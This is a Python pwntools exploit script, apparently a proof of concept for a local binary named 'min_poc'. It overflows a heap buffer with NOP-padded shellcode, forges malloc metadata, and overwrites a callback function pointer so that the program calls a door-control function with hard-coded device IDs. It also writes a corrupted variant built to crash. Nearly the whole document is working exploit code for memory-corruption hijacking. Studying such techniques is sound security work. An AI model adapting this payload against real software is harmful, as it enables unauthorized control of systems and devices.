#!/usr/bin/env python3

# import variables/functions from pwntools into our global namespace,
# for easy access
from pwn import *

EXE_PATH = '/home/jdiamond/src/fatal_core_dump/bin/min_poc'

# HandleSetSuitOccupant
ORIGINAL_FUNCTION_ADDRESS = 0x55555555526e
# ControlDoor
INJECT_FUNCTION_ADDRESS = 0x5555555551e9

BUFFER_STACK_ADDRESS = 0x7fffffffebb0

CALLBACK_HEAP_ADDRESS = 0x555555559330

CHECK_VALUE_OFFSET = 16
CHECK_VALUE = ord('a')

DEVICE_ID = 0xae215d67
DOOR_DEVICE_ID = 0xae215e13

BUFFER_SIZE = 128
MALLOC_META_SIZE = 16

context.binary = EXE_PATH


# 21 is the malloc bookkeeping value. It appears to be the size + 1 including this metadata. For the function pointer (size 8 bytes) this appears to be the 16 byte minimum size + 16 bytes for the metadata.
MALLOC_META_DATA = b'\x00' * 8 + p32(0x21) + b'\x00' * 4

# Want this one to crash in function without corrupting the the call stack when first N bytes are corrupted (ideally with ascii).
sh = asm(f'''
    push    rbp
    mov     rbp,rsp
    mov     rdx, rdi
    add     rdx, {CHECK_VALUE_OFFSET}
    cmp     DWORD PTR [rdx], {CHECK_VALUE}
    jne     .L_skip
    mov     rax, {INJECT_FUNCTION_ADDRESS}
    push    rdi
    push    rsi
    mov     rdi, {DEVICE_ID}
    mov     rsi, {DOOR_DEVICE_ID}
    mov     rdx, 1
    call    rax
    pop     rsi
    pop     rdi
    movabs  rax, {ORIGINAL_FUNCTION_ADDRESS}
    mov     qword ptr [{CALLBACK_HEAP_ADDRESS}], rax
.L_skip:
    mov     rax, {ORIGINAL_FUNCTION_ADDRESS}
    call    rax
    leave
    ret
''')

# Overall strategy:
# Write the checks for when to run the door open, and the call to the original function however works
# Stretch out the cleanup code for the door open call to be long enough to plausibly be the size of a setting block
# Besides the required stuff, this code can restore the original function pointer
# Align the shell code so a "block" overwrites the cleanup code and will trigger a crash.




print(f"Size of injection: {len(sh)}")

if len(sh) > BUFFER_SIZE:
    raise RuntimeError('len(sh) > BUFFER_SIZE')


filler_len = BUFFER_SIZE - len(sh)

payload = asm('nop') * filler_len
payload += sh
payload += MALLOC_META_DATA
payload += p64(BUFFER_STACK_ADDRESS + filler_len)

with open('./bin/input5_good', 'wb') as fd:
    fd.write(payload)


# ndisasm -b64 bin/input5
# 00000023  55                push rbp
# 00000024  4889E5            mov rbp,rsp
# 00000027  4889FA            mov rdx,rdi
# 0000002A  4883C210          add rdx,byte +0x10
# 0000002E  833A61            cmp dword [rdx],byte +0x61
# 00000031  753F              jnz 0x72
# 00000033  48B8E95155555555  mov rax,0x5555555551e9
#          -0000
# 0000003D  57                push rdi
# 0000003E  56                push rsi
# 0000003F  48BF675D21AE0000  mov rdi,0xae215d67
#          -0000
# 00000049  48BE135E21AE0000  mov rsi,0xae215e13
#          -0000
# 00000053  48C7C201000000    mov rdx,0x1
# 0000005A  FFD0              call rax
#! 0000005C  5E                pop rsi
#! 0000005D  5F                pop rdi
#! 0000005E  48B86E5255555555  mov rax,0x55555555526e
#!          -0000
#! 00000068  48A3309355555555  mov [qword 0x555555559330],rax
#!          -0000
#.L_skip:
# 00000072  48B86E5255555555  mov rax,0x55555555526e
#          -0000
# 0000007C  FFD0              call rax
# 0000007E  C9                leave
# 0000007F  C3                ret

corruption_offset = 0x5C
corruption_len = 16
corrupt_data = b'bass_volume: 83\x00'

if len(corrupt_data) != corruption_len:
    raise RuntimeError('len(corrupt_data) != corruption_len')

bad_payload = payload[:corruption_offset] + corrupt_data + payload[corruption_offset + corruption_len:]

with open('./bin/input5_bad', 'wb') as fd:
    fd.write(bad_payload)
